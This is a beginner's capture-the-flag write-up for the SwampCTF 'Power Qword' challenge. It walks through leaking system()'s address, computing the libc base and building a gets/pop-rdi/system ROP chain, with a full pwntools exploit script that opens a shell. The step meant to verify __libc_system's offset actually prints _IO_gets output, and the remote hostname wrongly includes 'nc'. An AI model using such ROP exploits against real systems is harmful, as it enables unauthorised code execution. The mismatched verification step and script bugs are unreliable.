# For Power Qword in swampctf


>The darkness increases as you descend down the stone steps towards The Source. The last vestiges of soft light begin to fade and a red haze starts to permeate the air. Suddenly, as you step on to a landing a MAGE blocks the way. He says...
>  
>Connect 
>nc chal1.swampctf.com 1999
>  
>-=Created By: digitalcold=-


I was unable to solve this challenge. I tried to but failed. [This writeup](https://fadec0d3.blogspot.sg/2018/04/swampctf-2018-power-qword.html) helped me understand where I went wrong. I just wish to share the dumb mistakes I made and what I learnt. This is a n00b's CTF diary, not an expert's guide on winning.

### The failed attempt

I downloaded the program and ran it locally.
```
solomonbstoner@swjsUbuntu:~/Downloads$ ./power 
Mage: The old books speak of a single Power QWord that grants
      its speaker a direct link to The Source.
Mage: Do you believe in such things? (yes/no): yes
Mage: Show me your conviction to The Source.
      Take this basis [the mage hands you 0x7f11c4bc5390]
      and speak the Power QWord: awfawf

Segmentation fault (core dumped)
```
The output was segmentation fault error. This means some memory that should not be accessed is being accessed. Okay. That is a clue, but not enough to solve the challenge.

##### Looks like ASLR
I noticed the value that the Mage hands me changes with each time I restart the program. When I see changing hex values, I think of ASLR.

```
Take this basis [the mage hands you 0x7f3544cda390]
Take this basis [the mage hands you 0x7f3310c54390]
Take this basis [the mage hands you 0x7f7c03713390]
Take this basis [the mage hands you 0x7f2e382cf390]
```



I *really* think it is ASLR. In GDB, The address returned is constant at `0x7ffff784e390` (and recall that gdb doesnt relect ASLR). So this is another clue.

##### Realising "yes" is the correct answer
Just out of curiousity, what happens if I were to be funny with Mage and say "no"?
```
Mage: Do you believe in such things? (yes/no): no
Mage: You underestimate the lessons of the old books...
[World: the mage fires a blinding white missile at you]
[World: you disintegrate]
solomonbstoner@swjsUbuntu:~/Downloads$ 
```
It looks like nothing useful happens. The disassembly also shows that the program executes `call exit` after disintigrating me, so our answer to Mage can only be "yes".
```
.text:00000000000009EE                 lea     rdi, aWorldTheMageFi ; "[World: the mage fires a blinding white"...
.text:00000000000009F5                 call    puts
.text:00000000000009FA                 lea     rdi, aWorldYouDisint ; "[World: you disintegrate]"
.text:0000000000000A01                 call    puts
.text:0000000000000A06                 xor     edi, edi        ; status
.text:0000000000000A08                 call    exit
```

After giving the input "yes", the following instructions are executed.
```
.text:0000000000000A37                 lea     rdi, file       ; "libc.so.6"
.text:0000000000000A3E                 mov     esi, 1          ; mode
.text:0000000000000A43                 call    dlopen
.text:0000000000000A48                 lea     rsi, name       ; "system"
.text:0000000000000A4F                 mov     rdi, rax        ; handle
.text:0000000000000A52                 call    dlsym
```
This opens up the file `libc.so.6` using `dlopen`. The function `dlsym()` takes a "handle" of a `libc.so.6` and the null-terminated symbol name "system", returning the address where that symbol is loaded into memory. My guess is that the address of the library function `system` is handed to us by Mage. That means it is possible for us to call `system('/bin//sh')` using Return Oriented Programming.

We can chain 2 ROP gadgets. The first one does `pop rdi; ret` to pop the string '/bin//sh' into `rdi`.  The second one, the address of which Mage gives to us, calls `system`. The format of the exploit code in my mind is somewhat like `< addr of 'pop rdi; ret' > < addr of the string '/bin//sh' > < addr of the library function system > < the string '/bin//sh' >`.

To see if this input is possible, I took a look at the disassembly that reads user input after "speak the Power QWord:" is printed.
```
.text:0000000000000A6D                 mov     rcx, cs:stdin@@GLIBC_2_2_5 ; stream
.text:0000000000000A74                 lea     rdi, [rbp+8]    ; ptr
.text:0000000000000A78                 mov     edx, 8          ; n
.text:0000000000000A7D                 mov     esi, 1          ; size
.text:0000000000000A82                 call    fread
```

`rbp+0x8` is `0x7fffffffdd18`. This means `fread` reads 8 chars from `stdin` to `0x7fffffffdd18`. Before the main function returns, `$rsp=0x7fffffffdd18`, so that means upon return, the program should return to whereever my value points. 8 characters is simply too short for my exploit code, so I am back to the drawing board. But at least I know now what the cause of the segmentation fault error is. 


As usual, when it looks like a function in any program returns to an address specified by user input, In this case, I tried with input "aaaabbb". Before the input, the return address from `main` is `0x7ffff7829830`.
```
0x7fffffffdd18:	0xf7829830	0x00007fff	0x00000001	0x00000000
0x7fffffffdd28:	0xffffdd28	0x00007fff	0xf7ffcca0	0x00000001
```

After `fread`, the return address is overwritten to value `0x0a62626261616161`. This is an illegal memory address, so a seg fault is expected.
```
0x7fffffffdd18:	0x61616161	0x0a626262	0x00000001	0x00000000
0x7fffffffdd28:	0xffffddf8	0x00007fff	0xf7ffcca0	0x00000001

=> 0x0000555555554a99 <main+297>:	c3	ret    
(gdb) ni

Program received signal SIGSEGV, Segmentation fault.
```

So, I found out the following:
1. ASLR is enabled
2. The address given by Mage is the address of library function `system` from the shared library`libc.so.6`
3. `fread` only accepts 8 characters, which is equivalent to just 1 return address. That means my exploit code can't work.

I am lost. I don't know what I can do. This challenge is too difficult for me...

##### Giving up

As I always do whenever I have exhausted every means of solving a problem but still cannot solve it, I just try random things that make no sense and hope it works. It fails everytime of course.

This time, I wrote this Python script to feed the address of the library function `system` into the program as input. It serves no purpose other than to illustrate my hopelessness.
```
from pwn import *

p = remote('chal1.swampctf.com', 1999)

p.recvuntil("):")

p.sendline("yes") #reply yes

addr = int(p.recvuntil("]")[-13:-1], 16)

p.recvuntil(":")

log.info("Address of system(): "+hex(addr))

payload = pack(addr, 'all', 'little', True)

log.info("Sending: " + payload)

p.send(payload)

p.interactive()
```


### Correcting my mistakes
Let's begin by comparing my intended payload and fadec0d3's payload.

| my payload        | fadec0d3's payload           |
| ------------- | ------------- |
| `< addr of 'pop rdi; ret' > < addr of the string '/bin//sh' > < addr of __libc_system > < the string '/bin//sh' >` | `<addr of _IO_gets> < addr of 'pop rdi; ret' > < addr of string '/bin/sh' > < addr of __libc_system >` |

Despite being a n00b, I take comfort in the fact that I was partially on the right track. Still, I chide myself for giving up when I should have realised that libc included functions like `gets` that allowed me to bypass `fread`'s 8 character limit.

##### Ingenuity of fadec0d3's payload
fadec0d3's payload is a ROP chain consisting of 3 ROP gadgets.
1. `_IO_gets`
2. `pop rdi; ret;`
3. `system`

First, `_IO_gets` will read the rest of the payload into the program. `pop rdi; ret` then pops the address of string '/bin/sh' into register `rdi`. Register `rdi` holds the first argument for syscalls in x64 architecture. Then `system('/bin/sh')` is called, giving us a shell.

##### Understanding the basics
To understand how the payload works, you need to understand how dynamic linkers work. I recommend reading [this]() article to get a basic understanding of how it works.

`./power` is dynamically linked. When `./power` is running, and requests for the shared library `libc.so.6`, the dynamic linker loads the shared library from the disk to memory. 
```
power: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8f67b4fbc3143f836a9c9968f58f0dd76c90fd51, not stripped
```
When the shared library is loaded, it gets relocated in memory. In other words, its memory address changes. 

##### Understanding how the payload works
To understand how the payload works and fadec0d3's explanation, I decided to make a Python script after fadec0d3's. I will explain snippets of it first before I show my complete script.

1. Getting the address Mage gifts us.
```
from pwn import *
[...]
r = process('./power')
[...]
r.recvuntil('(yes/no): ')
r.send('yes\n')
print("\n")
addr_of_system_in_power = int(r.recvuntil("]")[-13:-1], 16)
log.info("Address of system() in ./power: {}".format(hex(addr_of_system_in_power)))
```
As I correctly identified before, the address Mage gives us is the address of `__libc_system` in `./power`. The purpose of this is not just for us to return to `__libc_system`, but also for us to use it to calculate the base address of `libc.so.6` after being relocated by the dynamic linker.

2. Calculating the base address of `libc.so.6`
```
[...]
libc = ELF('libc.so.6')
[...]
addr_of_system_in_libc = libc.symbols['__libc_system']
log.info("Address of system() in libc.so.6: {}".format(hex(addr_of_system_in_libc)))
print("\n")
addr_of_libc_in_power = addr_of_system_in_power - addr_of_system_in_libc
log.info("Address of libc.so.6 base in ./power: {}".format(hex(addr_of_libc_in_power)))
print("\n")
```
Here, we load the shared library `libc.so.6` into our script and find the offset of the memory address of `__libc_system` to the base address of `libc.so.6` before relocation. By comparing that to the memory address of `__libc_system` in `./power`, we can find the base address of the shared library after relocation.
```
addr_of_libc_in_power = addr_of_system_in_power - addr_of_system_in_libc
log.info("Address of libc.so.6 base in ./power: {}".format(hex(addr_of_libc_in_power)))
```
Upon running, the 2 snippets above produce the output below
```
[*] Address of system() in ./power: 0x7f45fe3af390
[*] Address of system() in libc.so.6: 0x45390

[*] Address of libc.so.6 base in ./power: 0x7f45fe36a000
```
Let's check if `0x45390` is really the address of `__libc_system`:
```
solomonbstoner@swjsUbuntu:~$ objdump -d -M intel libc.so.6 | grep "_gets"
000000000006ed80 <_IO_gets@@GLIBC_2.2.5>:
   6ed98:	75 61                	jne    6edfb <_IO_gets@@GLIBC_2.2.5+0x7b>
```
Yes it is!
3. Calculating the relocated address of all other ROP gadgets.
With the relocated base address of `libc.so.6`, I am able to find the relocated address of all other ROP gadgets in `libc.so.6`. For instance, to find the relocated address of `_IO_gets`, this is my Python script below
```
[...]
addr_of_gets_in_libc = libc.symbols['_IO_gets']
log.info("Address of gets() in libc.so.6: {}".format(hex(addr_of_gets_in_libc)))
addr_of_gets_in_power = addr_of_libc_in_power + addr_of_gets_in_libc
log.info("Address of gets() in ./power: {}".format(hex(addr_of_gets_in_power)))
[...]
```
Upon running, this snippet produces the following output:
```
[*] Address of gets() in libc.so.6: 0x6ed80
[*] Address of gets() in ./power: 0x7f45fe3d8d80
```
Let's check if `0x6ed80` is really the address of `_IO_gets`:
```
solomonbstoner@swjsUbuntu:~$ objdump -d -M intel libc.so.6 | grep "_gets"
000000000006ed80 <_IO_gets@@GLIBC_2.2.5>:
   6ed98:	75 61                	jne    6edfb <_IO_gets@@GLIBC_2.2.5+0x7b>
```
Yes it is!

The same concept is used to find the relocated address of the string '/bin/sh' and ROP gadget 'pop rdi; ret;'
```
addr_of_binsh_in_libc = libc.search('/bin/sh').next()	#find address of string '/bin/sh'
log.info("Address of /bin/sh in libc.so.6: {}".format(hex(addr_of_binsh_in_libc)))
addr_of_binsh_in_power = addr_of_libc_in_power + addr_of_binsh_in_libc
log.info("Address of /bin/sh in ./power: {}".format(hex(addr_of_binsh_in_power)))

addr_of_poprdi_in_libc = libc.search('\x5F\xC3').next() #find address of ROP gadget 'pop rdi; ret'
log.info("Address of 'pop rdi; ret;' in libc.so.6: {}".format(hex(addr_of_poprdi_in_libc)))
addr_of_poprdi_in_power = addr_of_poprdi_in_libc + addr_of_libc_in_power
log.info("Address of 'pop rdi; ret;' in ./power: {}".format(hex(addr_of_poprdi_in_power)))
```
The snippet of code above produces the following output:
```
[*] Address of /bin/sh in libc.so.6: 0x18cd57
[*] Address of /bin/sh in ./power: 0x7f45fe4f6d57
[*] Address of 'pop rdi; ret;' in libc.so.6: 0x21102
[*] Address of 'pop rdi; ret;' in ./power: 0x7f45fe38b102
```
Actually, I wonder why there would be a string '/bin/sh' serving no purpose in the program, but the fact is there is.
```
solomonbstoner@swjsUbuntu:~$ strings libc.so.6 | grep "/bin/sh"
/bin/sh
```
4. Chaining the ROP gadgets
```
exploit = p64(addr_of_gets_in_power) + p64(addr_of_poprdi_in_power) + p64(addr_of_binsh_in_power) + p64(addr_of_system_in_power)
```
What the ROP chain does has been explained above.

##### Full script and full output
As promised, here is the full Python script.
```
from pwn import *
import sys

r = process('./power')

if(len(sys.argv) == 2 and sys.argv[1] == "--connect"):
	r = remote("nc chal1.swampctf.com", 1999)

libc = ELF('./libc.so.6')

def main():
	r.recvuntil('(yes/no): ')
	r.send('yes\n')
	print("\n")
	addr_of_system_in_power = int(r.recvuntil("]")[-13:-1], 16)
	log.info("Address of system() in ./power: {}".format(hex(addr_of_system_in_power)))
	r.recvuntil('Power QWord: ')
	addr_of_system_in_libc = libc.symbols['__libc_system']
	log.info("Address of system() in libc.so.6: {}".format(hex(addr_of_system_in_libc)))
	print("\n")
	addr_of_libc_in_power = addr_of_system_in_power - addr_of_system_in_libc
	log.info("Address of libc.so.6 base in ./power: {}".format(hex(addr_of_libc_in_power)))
	print("\n")
	
	addr_of_gets_in_libc = libc.symbols['_IO_gets']
	log.info("Address of gets() in libc.so.6: {}".format(hex(addr_of_gets_in_libc)))
	addr_of_gets_in_power = addr_of_libc_in_power + addr_of_gets_in_libc
	log.info("Address of gets() in ./power: {}".format(hex(addr_of_gets_in_power)))
	print("\n")

	addr_of_binsh_in_libc = libc.search('/bin/sh').next()	#find address of string '/bin/sh'
	log.info("Address of /bin/sh in libc.so.6: {}".format(hex(addr_of_binsh_in_libc)))
	addr_of_binsh_in_power = addr_of_libc_in_power + addr_of_binsh_in_libc
	log.info("Address of /bin/sh in ./power: {}".format(hex(addr_of_binsh_in_power)))

	addr_of_poprdi_in_libc = libc.search('\x5F\xC3').next() #find address of ROP gadget 'pop rdi; ret'
	log.info("Address of 'pop rdi; ret;' in libc.so.6: {}".format(hex(addr_of_poprdi_in_libc)))
	addr_of_poprdi_in_power = addr_of_poprdi_in_libc + addr_of_libc_in_power
	log.info("Address of 'pop rdi; ret;' in ./power: {}".format(hex(addr_of_poprdi_in_power)))


	exploit = p64(addr_of_gets_in_power) + p64(addr_of_poprdi_in_power) + p64(addr_of_binsh_in_power) + p64(addr_of_system_in_power)

	r.send(exploit)

	r.interactive()

if __name__ == "__main__":
	main()
```
This looks very much like the challenge [Vladivostok in microcorruption](https://github.com/solomonbstoner/solomonbston3r-ctf-diary/blob/master/microcorruption/Vladivostok%20Microcorruption.md). Both involve calculating the change in memory address of the functions we wish to use. While the change in memory address in Vladivostok is due to ASLR which is different from relocation of a shared library in this challenge, I believe the strategy to winning both is very much the same.

And this is the full output. However, take note that because ASLR is enabled, the address values will change all the time.
```
solomonbstoner@swjsUbuntu:~$ python power.py 
[+] Starting local process './power': pid 12113
[*] '/home/solomonbstoner/Desktop/CTF unsorted and disorganised/SwampCTF/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled


[*] Address of system() in ./power: 0x7f45fe3af390
[*] Address of system() in libc.so.6: 0x45390

[*] Address of libc.so.6 base in ./power: 0x7f45fe36a000

[*] Address of gets() in libc.so.6: 0x6ed80
[*] Address of gets() in ./power: 0x7f45fe3d8d80

[*] Address of /bin/sh in libc.so.6: 0x18cd57
[*] Address of /bin/sh in ./power: 0x7f45fe4f6d57
[*] Address of 'pop rdi; ret;' in libc.so.6: 0x21102
[*] Address of 'pop rdi; ret;' in ./power: 0x7f45fe38b102
[*] Switching to interactive mode
$ whoami
solomonbstoner
$ 
```
Had the challenge server still been up, I could have gotten the flag. But at least I learnt how to find ROP gadgets and form a ROP chain to get a shell.


### Extra fun fact
1. Although it is much easier to rely on `pwntools` to do everything for us, we can always try other tools. For instance, we can use [this website](http://ropshell.com/) to find our ROP gadgets too.
For example, let's try to find the address of `pop rdi; ret; ` in `libc.so.6`. 

Finding the rop gadget: http://ropshell.com/ropsearch?h=dc6abed98572f9e74390316f9d122aca&p=pop+rdi
```
ropshell> search pop rdi
found 1 gadgets
> 0x00021102 : pop rdi; ret
```
The address of the ROP gadget given by both sources are the same.
| ropshell.com | pwntools |
| --- | --- |
| 0x00021102 | 0x21102 |


END